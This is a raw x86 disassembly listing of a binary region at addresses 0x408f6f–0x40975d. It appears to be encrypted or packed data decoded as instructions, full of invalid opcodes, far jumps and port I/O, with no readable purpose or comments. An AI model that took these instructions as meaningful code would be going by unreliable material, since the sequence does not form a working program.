  408f6f:	jg     0x408f11
  408f71:	pop    ss
  408f72:	push   ds
  408f73:	shr    DWORD PTR [edx+0x43],cl
  408f76:	push   ecx
  408f77:	push   ss
  408f78:	loope  0x408f91
  408f7a:	adc    BYTE PTR ds:0x1ebc1b7c,bh
  408f80:	adc    BYTE PTR [edi-0x52],bl
  408f83:	(bad)  
  408f84:	sub    al,0x66
  408f86:	inc    ebx
  408f87:	jb     0x408f9d
  408f89:	mov    ecx,0x2da11adc
  408f8e:	push   ss
  408f8f:	cmp    al,0x97
  408f91:	pusha  
  408f92:	adc    BYTE PTR [ebp-0x32],bh
  408f95:	push   cs
  408f96:	lahf   
  408f97:	call   0xa599:0x8230c2ef
  408f9e:	fs push eax
  408fa0:	in     al,dx
  408fa1:	push   eax
  408fa2:	(bad)  
  408fa3:	or     DWORD PTR [edi+0x20],esp
  408fa6:	sub    esp,DWORD PTR [edx-0xc]
  408fa9:	sbb    ah,bl
  408fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fac:	xchg   ecx,eax
  408fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fae:	(bad)  
  408faf:	in     eax,dx
  408fb0:	cs in  al,dx
  408fb2:	ficom  DWORD PTR ds:[ebp+0x72f20f9b]
  408fb9:	fwait
  408fba:	test   DWORD PTR [ecx+0x4c],ebx
  408fbd:	je     0x408f75
  408fbf:	icebp  
  408fc0:	add    BYTE PTR [esi+0x2b50712b],dl
  408fc6:	xchg   ecx,eax
  408fc7:	int3   
  408fc8:	dec    edx
  408fc9:	xorps  xmm3,XMMWORD PTR ds:0x623bde24
  408fd0:	push   ss
  408fd1:	cmp    al,0x3c
  408fd3:	cli    
  408fd4:	repz push esp
  408fd6:	xor    al,0x86
  408fd8:	xchg   edx,eax
  408fd9:	retf   0xe40c
  408fdc:	cmp    DWORD PTR ds:0x383f2370,ebx
  408fe2:	mov    eax,0x25d11187
  408fe7:	xor    eax,esi
  408fe9:	xor    al,0xa1
  408feb:	retf   
  408fec:	sub    dl,0xdb
  408fef:	out    0xf8,eax
  408ff1:	int3   
  408ff2:	jb     0x408fc9
  408ff4:	aaa    
  408ff5:	sbb    dh,cl
  408ff7:	nop
  408ff8:	(bad)  
  408ff9:	mov    WORD PTR [eax-0x2b],?
  408ffc:	mov    ch,0x90
  408ffe:	xchg   ebp,eax
  408fff:	cmp    DWORD PTR [esi],ebx
  409001:	call   0xf3b4:0xf1a734c5
  409008:	ds ins DWORD PTR es:[edi],dx
  40900a:	clc    
  40900b:	sar    BYTE PTR [edi],1
  40900d:	add    DWORD PTR [ebx+eiz*2-0x73],0xfffffffc
  409012:	pop    edi
  409013:	aaa    
  409014:	shl    DWORD PTR [ebp+0x7c590d24],cl
  40901a:	and    edi,edx
  40901c:	lea    eax,[edx]
  40901e:	sub    bp,WORD PTR [ecx+0x1f]
  409022:	into   
  409023:	in     eax,0x6d
  409025:	xor    eax,0x83654ac
  40902a:	js     0x408fe7
  40902c:	in     eax,dx
  40902d:	cs xchg edx,eax
  40902f:	jo     0x408fba
  409031:	sub    esp,DWORD PTR [ebp-0x6b]
  409034:	push   cs
  409035:	mov    ebx,0x260fc860
  40903a:	pop    esi
  40903b:	scas   al,BYTE PTR es:[edi]
  40903c:	sbb    dh,BYTE PTR [edx-0x7b1469d6]
  409042:	leave  
  409043:	loop   0x40908b
  409045:	and    BYTE PTR [ebx+0x74],ah
  409048:	jg     0x408fd9
  40904a:	jb     0x409097
  40904c:	mov    WORD PTR [ebx],fs
  40904e:	(bad)
  409052:	jg     0x40902c
  409054:	mov    WORD PTR [edi+0x4ece6ba1],?
  40905a:	enter  0x777,0x5c
  40905e:	int    0x1a
  409060:	retf   0x6e36
  409063:	cmp    BYTE PTR [ebp+ecx*2+0x13],0xf8
  409068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409069:	sbb    BYTE PTR [esi+0x79],bl
  40906c:	ficom  WORD PTR [ecx]
  40906e:	inc    ebp
  40906f:	pop    ebx
  409070:	in     eax,0xfb
  409072:	pop    esi
  409073:	call   0xde8ab72b
  409078:	mov    ch,0x1c
  40907a:	enter  0x6609,0x7a
  40907e:	sbb    DWORD PTR [ecx],0x2c
  409081:	mov    cl,0x55
  409083:	sbb    BYTE PTR [edx-0x2f],ch
  409086:	test   al,0xa2
  409088:	mov    dl,0xa3
  40908a:	stos   DWORD PTR es:[edi],eax
  40908b:	ret    
  40908c:	inc    ebp
  40908d:	xor    eax,eax
  40908f:	xor    esi,0xc5a5d140
  409095:	rol    bh,0xf1
  409098:	cs (bad) 
  40909a:	lar    ecx,WORD PTR [edi+0xfe0256d]
  4090a1:	or     BYTE PTR [edi],ch
  4090a3:	adc    edx,ebp
  4090a5:	pop    eax
  4090a6:	add    eax,0x278e8b67
  4090ab:	mov    WORD PTR [esp+edi*8+0x47188f99],?
  4090b2:	ret    
  4090b3:	mov    ecx,0xc3342f92
  4090b8:	ins    DWORD PTR es:[edi],dx
  4090b9:	xchg   ebx,eax
  4090ba:	cmp    BYTE PTR ds:0xc1b766b2,cl
  4090c0:	cmp    bh,bl
  4090c2:	add    eax,DWORD PTR [edx]
  4090c4:	(bad)  [ebp+0x54a80f59]
  4090ca:	or     eax,0x2d65b543
  4090cf:	test   al,0x1e
  4090d1:	inc    esp
  4090d2:	test   eax,0xb80ed7a9
  4090d7:	in     eax,0x18
  4090d9:	sbb    BYTE PTR [esi-0x4a7f79a],dh
  4090df:	imul   ecx,DWORD PTR es:[eax-0x3d85af8a],0xffffff8b
  4090e7:	cmp    esp,0x475ae736
  4090ed:	and    ebx,DWORD PTR [ebp-0x23]
  4090f0:	sar    BYTE PTR [edi+0x620f2f8f],1
  4090f6:	push   cs
  4090f7:	jecxz  0x40909d
  4090f9:	push   ecx
  4090fa:	hlt    
  4090fb:	div    DWORD PTR [edi+ebp*4-0x36]
  4090ff:	popf   
  409100:	dec    eax
  409101:	mov    BYTE PTR [esi+0x7d2e5e66],dl
  409107:	ins    BYTE PTR es:[edi],dx
  409108:	fsub   st(2),st
  40910a:	shr    eax,0x63
  40910d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40910e:	or     eax,0xd7f4ee6a
  409113:	cmp    bl,bl
  409115:	mov    edx,0x428aba33
  40911a:	ins    BYTE PTR es:[edi],dx
  40911b:	out    0x22,al
  40911d:	(bad)  
  40911e:	xchg   ebx,eax
  40911f:	jbe    0x409146
  409121:	or     DWORD PTR [eax-0x648fb2f8],ebx
  409127:	test   DWORD PTR [ecx+0x4a52e7ac],0x70e68bab
  409131:	or     edi,eax
  409133:	loopne 0x40913c
  409135:	and    ch,BYTE PTR [edi+eax*4-0x7d]
  409139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913a:	pop    ss
  40913b:	ret    0xd5e5
  40913e:	xchg   esi,eax
  40913f:	mov    al,ds:0x9eaca43e
  409144:	push   edi
  409145:	ins    DWORD PTR es:[edi],dx
  409146:	sub    al,0x24
  409148:	push   0x965e5742
  40914d:	cld    
  40914e:	mov    WORD PTR [esi-0x1eb404ee],?
  409154:	stc    
  409155:	ja     0x40919a
  409157:	cld    
  409158:	bound  ebx,QWORD PTR [eax+0x79]
  40915b:	ret    0xa53
  40915e:	mov    edi,esp
  409160:	repnz dec ecx
  409162:	pop    ebp
  409163:	rcl    BYTE PTR [eax],0xc0
  409166:	outs   dx,DWORD PTR ds:[esi]
  409167:	pop    ss
  409168:	les    eax,FWORD PTR [edi]
  40916a:	div    BYTE PTR [ebx+0x6391ce9d]
  409170:	mov    ebx,0xccdcd32d
  409175:	cwde   
  409176:	sets   BYTE PTR [ecx+ecx*2+0x1525ddaf]
  40917e:	xchg   edx,eax
  40917f:	sub    ah,ah
  409181:	lahf   
  409182:	repnz pop DWORD PTR [edi-0x17]
  409186:	lahf   
  409187:	std    
  409188:	pop    ecx
  409189:	jl     0x409132
  40918b:	mov    eax,ds:0xff3d3f92
  409190:	cmp    BYTE PTR [ecx-0x5d],bh
  409193:	cmp    esp,DWORD PTR [ecx]
  409195:	scas   al,BYTE PTR es:[edi]
  409196:	or     al,0xc
  409198:	aaa    
  409199:	cwde   
  40919a:	push   cs
  40919b:	stos   BYTE PTR es:[edi],al
  40919c:	mov    ebx,0xa360bc5d
  4091a1:	inc    ecx
  4091a2:	xchg   ebp,eax
  4091a3:	jno    0x409125
  4091a5:	cmp    ah,BYTE PTR [edx+0x4429d84]
  4091ab:	jl     0x409222
  4091ad:	pop    es
  4091ae:	ror    BYTE PTR [esi-0x3dacede4],1
  4091b4:	pop    ds
  4091b5:	call   0xf1fc45bf
  4091ba:	inc    edx
  4091bb:	iret   
  4091bc:	mov    esp,0x9d6dd2f4
  4091c1:	arpl   WORD PTR [edi+0x5dc48080],bp
  4091c7:	enter  0x7d60,0x3
  4091cb:	adc    BYTE PTR [ecx],al
  4091cd:	(bad)  
  4091ce:	shl    DWORD PTR [edx-0x67],0xf3
  4091d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d3:	push   ebp
  4091d4:	sahf   
  4091d5:	cdq    
  4091d6:	lea    ebp,[edi]
  4091d8:	imul   esp,DWORD PTR [edi-0xa],0xffffff91
  4091dc:	pop    es
  4091dd:	inc    ebp
  4091de:	and    dl,ch
  4091e0:	mov    WORD PTR [ebp+0x40],ss
  4091e3:	gs leave 
  4091e5:	mov    cl,BYTE PTR [edi-0x1a66d07b]
  4091eb:	ds push esi
  4091ed:	add    eax,0x6f10f55
  4091f2:	lods   al,BYTE PTR ds:[esi]
  4091f3:	jp     0x40922c
  4091f5:	cmp    al,0x78
  4091f7:	jae    0x40918c
  4091f9:	jae    0x409216
  4091fb:	and    DWORD PTR [esi],esi
  4091fd:	call   0x996a:0xcd3e1bc7
  409204:	scas   al,BYTE PTR es:[edi]
  409205:	call   0x3578:0x20aa24da
  40920c:	mov    al,0xca
  40920e:	push   ss
  40920f:	(bad)  
  409210:	xchg   ecx,eax
  409211:	std    
  409212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409213:	mov    dh,0x50
  409215:	in     eax,0x61
  409217:	rcl    BYTE PTR [ecx],cl
  409219:	out    0x90,eax
  40921b:	jp     0x4091d6
  40921d:	out    dx,eax
  40921e:	add    esi,DWORD PTR [ecx+0x67]
  409221:	sbb    BYTE PTR [esi+eiz*1-0xe5cdbe0],bh
  409228:	add    ecx,esi
  40922a:	jne    0x409250
  40922c:	pushf  
  40922d:	stos   BYTE PTR es:[edi],al
  40922e:	sbb    edx,DWORD PTR [edx-0x23ddf3b0]
  409234:	or     ecx,edx
  409236:	inc    esi
  409237:	loop   0x40921d
  409239:	xchg   sp,ax
  40923b:	jecxz  0x409290
  40923d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40923e:	jl     0x409252
  409240:	or     ch,0x84
  409243:	or     ecx,edx
  409245:	mov    esp,DWORD PTR [ecx-0x4201fc3]
  40924b:	cmp    edx,DWORD PTR [ecx*1+0x517779fe]
  409252:	outs   dx,BYTE PTR ds:[esi]
  409253:	not    esi
  409255:	pop    esi
  409256:	or     esp,DWORD PTR [eax-0x7d3cfad2]
  40925c:	adc    bl,BYTE PTR [edi+0x4b]
  40925f:	adc    eax,0x2c77ac58
  409264:	inc    esi
  409265:	fs mov ch,0x96
  409268:	hlt    
  409269:	inc    ecx
  40926a:	or     esi,DWORD PTR [esi]
  40926c:	outs   dx,DWORD PTR ds:[esi]
  40926d:	pop    eax
  40926e:	jno    0x4092e5
  409270:	imul   edi,DWORD PTR ds:0x7042f647,0xc3cfc3b1
  40927a:	xor    bl,0x9e
  40927d:	imul   edi,DWORD PTR [ebp*2+0x696fbd5a],0xa
  409285:	mov    al,ds:0xfcb1e9d2
  40928a:	das    
  40928b:	inc    edx
  40928c:	in     al,0xf0
  40928e:	inc    edi
  40928f:	int    0xeb
  409291:	ror    ch,0x5b
  409294:	addr16 dec esp
  409296:	jl     0x4092c6
  409298:	icebp  
  409299:	data16 jne 0x40931a
  40929c:	push   ebp
  40929d:	bts    DWORD PTR ds:0xae8fdc9d,edi
  4092a4:	cmp    DWORD PTR [edi+0x3b],ebx
  4092a7:	jo     0x40923a
  4092a9:	mov    esp,0xd3ff1535
  4092ae:	xchg   edi,eax
  4092af:	aaa    
  4092b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092b1:	out    dx,eax
  4092b2:	xor    ah,dh
  4092b4:	push   es
  4092b5:	xor    esi,DWORD PTR [ebx-0x68]
  4092b8:	sbb    al,BYTE PTR [eax]
  4092ba:	pop    ds
  4092bb:	xor    al,0x3a
  4092bd:	mov    dl,0xa4
  4092bf:	mov    edx,0x4054f44c
  4092c4:	scas   al,BYTE PTR es:[edi]
  4092c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c6:	push   eax
  4092c7:	sar    BYTE PTR [esi-0x60],1
  4092ca:	adc    eax,0x315c41
  4092cf:	lea    esi,[esp+esi*1-0x5529f385]
  4092d6:	add    al,0xdc
  4092d8:	mov    dl,0xaf
  4092da:	pop    ebx
  4092db:	push   ss
  4092dc:	(bad)  
  4092dd:	lahf   
  4092de:	or     BYTE PTR [esi-0x529dd522],al
  4092e4:	adc    al,BYTE PTR [ebx-0x5bfe2bca]
  4092ea:	add    eax,0xa4f81c0a
  4092ef:	daa    
  4092f0:	shr    BYTE PTR [edx+0x6745e80f],0x25
  4092f7:	mov    esi,0x1cd82a9e
  4092fc:	iret   
  4092fd:	mov    edi,0xb56170db
  409302:	out    0xbf,eax
  409304:	in     al,0xda
  409306:	mov    ebp,0x6a8b9522
  40930b:	cmc    
  40930c:	jns    0x4092d1
  40930e:	add    cl,BYTE PTR [eax]
  409310:	pop    ebp
  409311:	xchg   edi,eax
  409312:	fsub   DWORD PTR [edi]
  409314:	mov    esi,0x56c2928b
  409319:	dec    ebx
  40931a:	push   ds
  40931b:	cmp    DWORD PTR [esi+0x29],esi
  40931e:	push   esp
  40931f:	pop    esi
  409320:	fiadd  WORD PTR [esi+0x6f]
  409323:	in     eax,0x51
  409325:	jae    0x409387
  409327:	cmp    bh,BYTE PTR [edx]
  409329:	rol    DWORD PTR [eax],1
  40932b:	(bad)  
  40932c:	pop    eax
  40932d:	fnstenv [ecx-0x4b36d602]
  409333:	dec    esp
  409334:	adc    al,BYTE PTR ds:0x2d5cd7f0
  40933a:	ss iret 
  40933c:	add    DWORD PTR [eax],ebp
  40933e:	mov    DWORD PTR [ecx+0x87b22ba],esi
  409344:	push   esi
  409345:	cmp    al,0x2a
  409347:	cdq    
  409348:	inc    esi
  409349:	sub    bp,WORD PTR [eax+0x33]
  40934d:	fnstsw WORD PTR [ebx-0x63]
  409350:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  409352:	sub    al,0x27
  409354:	or     ah,al
  409356:	fucomi st,st(5)
  409358:	sub    al,0x65
  40935a:	pushf  
  40935b:	gs dec esi
  40935d:	xchg   esi,eax
  40935e:	mov    dh,0xe5
  409360:	int    0x5e
  409362:	xor    edx,DWORD PTR [esi]
  409364:	and    edx,DWORD PTR [edi-0x4f63f360]
  40936a:	out    dx,al
  40936b:	sbb    al,0x78
  40936d:	cmp    al,0xe7
  40936f:	pop    eax
  409370:	sti    
  409371:	iret   
  409372:	aam    0x5e
  409374:	popf   
  409375:	cmp    BYTE PTR [ecx],cl
  409377:	les    esp,FWORD PTR cs:[bp+di+0x22b9]
  40937d:	data16 jno 0x4093ac
  409380:	mov    bh,0x72
  409382:	pop    es
  409383:	clc    
  409384:	pusha  
  409385:	adc    esp,DWORD PTR [eax+esi*8-0x23]
  409389:	and    eax,0x4299b37b
  40938e:	les    esi,FWORD PTR [ebp-0x34b3c736]
  409394:	out    dx,al
  409395:	push   ebp
  409396:	push   ebp
  409397:	jno    0x4093ac
  409399:	push   eax
  40939a:	or     DWORD PTR [ecx+0x75],ecx
  40939d:	jmp    0xa8dd:0x129d4e53
  4093a4:	jecxz  0x409358
  4093a6:	lahf   
  4093a7:	mov    BYTE PTR [ecx-0x75],al
  4093aa:	pop    ecx
  4093ab:	fprem  
  4093ad:	pushf  
  4093ae:	mov    ds:0xb79560e4,al
  4093b3:	or     ebx,DWORD PTR [ebp+0x4c]
  4093b6:	mov    WORD PTR [edx-0x782bf4ac],?
  4093bc:	imul   esp,DWORD PTR [edx-0x739c80fc],0x5f5d07fa
  4093c6:	test   eax,0xe47b2437
  4093cb:	xchg   DWORD PTR [edx],esi
  4093cd:	mov    edx,0x32213b8d
  4093d2:	(bad)  [eax+esi*8-0x7691d1db]
  4093d9:	xchg   edi,eax
  4093da:	pop    ecx
  4093db:	daa    
  4093dc:	sbb    dh,dl
  4093de:	test   DWORD PTR [ebx+esi*4],ebx
  4093e1:	cmp    eax,0x7bfc4a27
  4093e6:	sub    BYTE PTR [esi-0xf],0x8f
  4093ea:	(bad)  
  4093eb:	sbb    eax,0x6cbcb91e
  4093f0:	nop
  4093f1:	rcl    BYTE PTR [edi],1
  4093f3:	jecxz  0x40941b
  4093f5:	push   ebp
  4093f6:	sbb    al,0xe5
  4093f8:	or     al,0x11
  4093fa:	ret    
  4093fb:	lea    eax,[ecx]
  4093fd:	add    eax,0x795e0c02
  409402:	push   0x14
  409404:	cmc    
  409405:	aad    0xd0
  409407:	sub    BYTE PTR [ebx-0x19],bh
  40940a:	stos   BYTE PTR es:[edi],al
  40940b:	mov    dh,0xbe
  40940d:	sbb    eax,0x5a5440e3
  409412:	jb     0x4093f1
  409414:	and    ebp,DWORD PTR [ecx+0x17ec8ad1]
  40941a:	aad    0x6d
  40941c:	(bad)  
  40941d:	mov    dh,0xb5
  40941f:	(bad)  
  409420:	ror    BYTE PTR [edx-0x50],0x11
  409424:	hlt    
  409425:	sub    al,0x0
  409427:	xchg   esp,eax
  409428:	mov    ecx,0xe7c6a9a7
  40942d:	sbb    eax,0x4437031b
  409432:	xor    al,0x85
  409434:	daa    
  409435:	xchg   ecx,eax
  409436:	ds leave 
  409438:	fimul  WORD PTR [edx-0x30217147]
  40943e:	dec    eax
  40943f:	(bad)  
  409440:	in     eax,dx
  409441:	fwait
  409442:	adc    bh,BYTE PTR [ebp-0x5d]
  409445:	mov    eax,ds:0x9eb82fa4
  40944a:	mov    dh,0xbb
  40944c:	pop    eax
  40944d:	scas   eax,DWORD PTR es:[edi]
  40944e:	jl     0x409430
  409450:	dec    esi
  409451:	sbb    al,0x79
  409453:	mov    eax,0x4047c5a0
  409458:	xlat   BYTE PTR ds:[ebx]
  409459:	mov    dl,0xe7
  40945b:	sub    al,BYTE PTR [edx-0x5f]
  40945e:	mov    ecx,0x4d1ea5e5
  409463:	std    
  409464:	xchg   BYTE PTR [edx+edx*2],bl
  409467:	stos   BYTE PTR es:[edi],al
  409468:	enter  0x26b0,0xd3
  40946c:	cmp    eax,0xaa1d4d2a
  409471:	mov    ebp,0x60887c83
  409476:	mov    esp,0x44919f43
  40947b:	cwde   
  40947c:	push   0x86795545
  409481:	push   cs
  409482:	xchg   ebp,eax
  409483:	imul   ebp,DWORD PTR [eax-0x2a],0x62345330
  40948a:	stos   BYTE PTR es:[edi],al
  40948b:	lods   eax,DWORD PTR ds:[esi]
  40948c:	inc    ecx
  40948d:	xchg   edx,eax
  40948e:	fstp   DWORD PTR [edx+0x30]
  409491:	js     0x4094ea
  409493:	mov    BYTE PTR [edx+0x3e],ch
  409496:	mov    esi,0xaeb0009d
  40949b:	(bad)  
  40949c:	fist   DWORD PTR [edi-0x141feafe]
  4094a2:	push   edi
  4094a3:	adc    al,0x2d
  4094a5:	jo     0x409476
  4094a7:	dec    ebp
  4094a8:	hlt    
  4094a9:	shl    al,1
  4094ab:	or     BYTE PTR [edx-0x4c1b7f56],0x6b
  4094b2:	or     al,0x8
  4094b4:	jb     0x40944d
  4094b6:	jno    0x409467
  4094b8:	add    al,0x46
  4094ba:	or     bl,cl
  4094bc:	sub    dl,BYTE PTR [ebx+0x9]
  4094bf:	(bad)  
  4094c0:	aad    0xe7
  4094c2:	leave  
  4094c3:	bound  esp,QWORD PTR [edx]
  4094c5:	cmp    eax,0xf0716fe5
  4094ca:	into   
  4094cb:	inc    eax
  4094cc:	sbb    edi,DWORD PTR [edx+0x12]
  4094cf:	ins    DWORD PTR es:[edi],dx
  4094d0:	inc    esi
  4094d1:	pop    esp
  4094d2:	outs   dx,BYTE PTR ds:[esi]
  4094d3:	into   
  4094d4:	lahf   
  4094d5:	cmp    dh,BYTE PTR [esp+edi*4-0x38]
  4094d9:	das    
  4094da:	rcl    DWORD PTR [esi],0x34
  4094dd:	aaa    
  4094de:	jmp    0xe9d6:0xe9c37e0f
  4094e5:	jae    0x409496
  4094e7:	rcl    BYTE PTR ds:0x6aaa,1
  4094ec:	aas    
  4094ed:	lods   eax,DWORD PTR ds:[esi]
  4094ee:	scas   eax,DWORD PTR es:[edi]
  4094ef:	sub    eax,0x3d3bc4f0
  4094f4:	adc    DWORD PTR [ebp+0x3d67a0ba],ecx
  4094fa:	jnp    0x409510
  4094fc:	in     eax,0x5e
  4094fe:	clc    
  4094ff:	add    DWORD PTR [ebp-0x24],eax
  409502:	add    eax,0x7a30962c
  409507:	rol    esi,1
  409509:	inc    esi
  40950a:	pop    ss
  40950b:	sar    DWORD PTR [edi+0x233b155e],0xed
  409512:	test   eax,0x3834bcc
  409517:	jnp    0x40949c
  409519:	je     0x409528
  40951b:	cld    
  40951c:	pop    eax
  40951d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951e:	sub    eax,0x53d45bb6
  409523:	out    dx,eax
  409524:	test   esp,eax
  409526:	sub    bh,BYTE PTR [ebx-0x5fae0e4b]
  40952c:	scas   eax,DWORD PTR es:[edi]
  40952d:	pop    es
  40952e:	in     eax,0x80
  409530:	xchg   ebp,ebx
  409532:	sti    
  409533:	retf   0x88f0
  409536:	mov    DWORD PTR [esi],ebx
  409538:	add    dl,BYTE PTR [eax]
  40953a:	mov    DWORD PTR [esi+ebp*1-0x7c],edx
  40953e:	(bad)  
  40953f:	fsub   st,st(1)
  409541:	data16 cmp dh,bh
  409544:	sub    al,0x7a
  409546:	fs dec esp
  409548:	cmp    eax,0xe7a941f7
  40954d:	ja     0x409566
  40954f:	pop    esp
  409550:	pop    ss
  409551:	das    
  409552:	(bad)  
  409554:	mov    ds:0xd5f7a06a,eax
  409559:	sub    ch,dl
  40955b:	iret   
  40955c:	pop    esp
  40955d:	mov    al,0x71
  40955f:	je     0x409541
  409561:	stos   BYTE PTR es:[edi],al
  409562:	pop    ebp
  409563:	loope  0x40953f
  409565:	adc    ebp,ebp
  409567:	mov    ds:0xbe317831,eax
  40956c:	or     edx,DWORD PTR [ebx]
  40956e:	sub    al,0xb3
  409570:	xchg   ebx,eax
  409571:	retf   
  409572:	pcmpgtw mm7,QWORD PTR [eax-0x5f5583ab]
  409579:	sbb    DWORD PTR [ebx-0x1f],0xd121dd62
  409580:	and    ebx,0x33d8a17c
  409586:	leave  
  409587:	scas   eax,DWORD PTR es:[edi]
  409588:	xchg   ecx,eax
  409589:	push   esp
  40958a:	int3   
  40958b:	and    eax,0xce4841c2
  409590:	or     DWORD PTR [ebx+edx*1+0x47b36ea8],eax
  409597:	push   ss
  409598:	sti    
  409599:	jmp    0xd1a0:0xb5b3aaa1
  4095a0:	ret    
  4095a1:	(bad)  
  4095a2:	lock leave 
  4095a4:	cmp    edi,ecx
  4095a6:	jb     0x40953c
  4095a8:	pop    edx
  4095a9:	sub    BYTE PTR [edi+0x5c],ah
  4095ac:	ss jbe 0x40952f
  4095af:	inc    WORD PTR [eax-0x20925264]
  4095b6:	xor    al,0x5c
  4095b8:	mov    ds:0xb15706d2,eax
  4095bd:	popf   
  4095be:	and    ch,BYTE PTR [esi]
  4095c0:	fld    TBYTE PTR [ebx]
  4095c2:	mov    bh,0xe4
  4095c4:	inc    esi
  4095c5:	jmp    0xa9c4:0x9749c794
  4095cc:	inc    ebx
  4095cd:	sub    ebx,0xd6b010cf
  4095d3:	or     bh,BYTE PTR [ebp+0x2f]
  4095d6:	pop    esp
  4095d7:	xchg   BYTE PTR [edi],al
  4095d9:	and    eax,0x257f37a5
  4095de:	ret    
  4095df:	imul   edi,ebx,0x12
  4095e2:	in     eax,dx
  4095e3:	in     al,dx
  4095e4:	cmp    BYTE PTR [esi],bh
  4095e6:	ss shl esi,0xd8
  4095ea:	shl    DWORD PTR [ebx],0x15
  4095ed:	inc    ecx
  4095ee:	adc    eax,edx
  4095f0:	cmp    BYTE PTR [esi],bl
  4095f2:	mov    ebp,0xbed8becf
  4095f7:	mov    dh,0xc1
  4095f9:	add    eax,0x1c60c696
  4095fe:	data16 out dx,al
  409600:	jmp    0x5a1:0x719ebba1
  409607:	lea    esp,[edx+0xce62eb1]
  40960d:	data16 or al,0xca
  409610:	add    eax,0xd025f0a2
  409615:	pop    esi
  409616:	sbb    bh,BYTE PTR [eax-0x3bd7d479]
  40961c:	adc    DWORD PTR [ebp-0x51],edi
  40961f:	in     al,dx
  409620:	retf   
  409621:	out    dx,al
  409622:	dec    ecx
  409623:	and    al,0x0
  409625:	ins    DWORD PTR es:[edi],dx
  409626:	jo     0x40966c
  409628:	pop    eax
  409629:	fnstcw WORD PTR [edi+0x25]
  40962c:	or     al,0x91
  40962e:	lahf   
  40962f:	and    eax,0x5e7eb03a
  409634:	sub    DWORD PTR [eax+0x490e31c0],0xa8892dfd
  40963e:	mov    ecx,0x77ae9fa2
  409643:	popf   
  409644:	dec    edi
  409645:	lahf   
  409646:	or     edx,DWORD PTR [edx-0x66b5414a]
  40964c:	jmp    0x289:0x6692c460
  409653:	sbb    esp,eax
  409655:	mov    ecx,DWORD PTR [edx]
  409657:	cmp    al,0x22
  409659:	mov    BYTE PTR [esi-0x44],bl
  40965c:	popf   
  40965d:	pop    ebx
  40965e:	ins    BYTE PTR es:[edi],dx
  40965f:	mov    bl,0x9d
  409661:	pushf  
  409662:	mov    WORD PTR [edx-0x78ff8a28],fs
  409668:	mov    edx,0x531aa3b0
  40966d:	push   ds
  40966e:	pushf  
  40966f:	xchg   edx,eax
  409670:	test   eax,0x922d243c
  409675:	mov    ds:0x143ab80b,eax
  40967a:	adc    cl,BYTE PTR [esi-0xc]
  40967d:	ss mov esi,0x77c0653c
  409683:	sqrtps xmm0,XMMWORD PTR [eax+0x3a1fb9b3]
  40968a:	mov    dl,0xc6
  40968c:	mov    dh,0x95
  40968e:	mov    WORD PTR [ecx-0x34],gs
  409691:	mov    ch,0xe2
  409693:	push   cs
  409694:	icebp  
  409695:	add    al,0x71
  409697:	push   es
  409698:	ficomp WORD PTR [ecx+ebp*4]
  40969b:	and    DWORD PTR [eax+0x7b],esi
  40969e:	loope  0x409655
  4096a0:	mov    bl,0x45
  4096a2:	(bad)  
  4096a3:	mov    ds:0xa1b06cb4,al
  4096a8:	test   ebp,esp
  4096aa:	scas   eax,DWORD PTR es:[edi]
  4096ab:	push   ebp
  4096ac:	gs pop edx
  4096ae:	inc    ecx
  4096af:	cli    
  4096b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096b1:	xchg   esp,eax
  4096b2:	aad    0x42
  4096b4:	or     esp,DWORD PTR [ecx+edx*2]
  4096b7:	jno    0x409665
  4096b9:	les    esi,FWORD PTR [ecx-0x2869cd23]
  4096bf:	pop    sp
  4096c1:	cmp    eax,0xe2d81b83
  4096c6:	ss push ds
  4096c8:	mov    cl,0x1e
  4096ca:	or     al,0xc
  4096cc:	jb     0x40973a
  4096ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096cf:	sbb    ebx,esp
  4096d1:	repnz fldenv [ebx]
  4096d4:	push   ebp
  4096d5:	popf   
  4096d6:	lahf   
  4096d7:	xor    al,0x84
  4096d9:	jmp    0x4096ec
  4096db:	or     al,0x65
  4096dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096de:	daa    
  4096df:	mov    ecx,0x75f12f37
  4096e4:	push   edx
  4096e5:	adc    al,BYTE PTR [edx-0x15]
  4096e8:	adc    DWORD PTR [esi-0x390597f4],eax
  4096ee:	jl     0x409699
  4096f0:	and    edx,DWORD PTR [ebx-0xe65a816]
  4096f6:	fstp   QWORD PTR [edx]
  4096f8:	and    esi,0xffffffba
  4096fb:	push   esp
  4096fc:	fbstp  TBYTE PTR [esi]
  4096fe:	popf   
  4096ff:	add    DWORD PTR [ebx-0x35],ecx
  409702:	adc    edx,esp
  409704:	shr    BYTE PTR [esi+0x2],cl
  409707:	into   
  409708:	frstor [edx-0x20b699c9]
  40970e:	jmp    0x4096b0
  409710:	ficomp DWORD PTR [edx+0x4f]
  409713:	jmp    0x40973c
  409715:	pop    esi
  409716:	imul   edi,DWORD PTR [eax+0x3b7167a2],0xffffffd5
  40971d:	in     eax,0x4d
  40971f:	mov    ebp,0xf7ebc79f
  409724:	sbb    eax,0x1828d89e
  409729:	mul    esp
  40972b:	ret    
  40972c:	mov    cl,0xf9
  40972e:	and    al,0xfb
  409730:	dec    eax
  409731:	lods   al,BYTE PTR ds:[esi]
  409732:	ins    DWORD PTR es:[edi],dx
  409733:	pop    ebx
  409734:	mov    eax,DWORD PTR [edi-0x2ba750fb]
  40973a:	mov    ebx,0x58a67ff6
  40973f:	ror    BYTE PTR gs:[edx+esi*4+0x5f],cl
  409744:	sahf   
  409745:	hlt    
  409746:	push   0xffffffb3
  409748:	ds cs loope 0x409738
  40974c:	push   ds
  40974d:	ret    0x8342
  409750:	stos   DWORD PTR es:[edi],eax
  409751:	lock and eax,0x2748511d
  409757:	scas   eax,DWORD PTR es:[edi]
  409758:	das    
  409759:	cmp    edx,ebp
  40975b:	sub    cl,dl
  40975d:	jge    0x409780
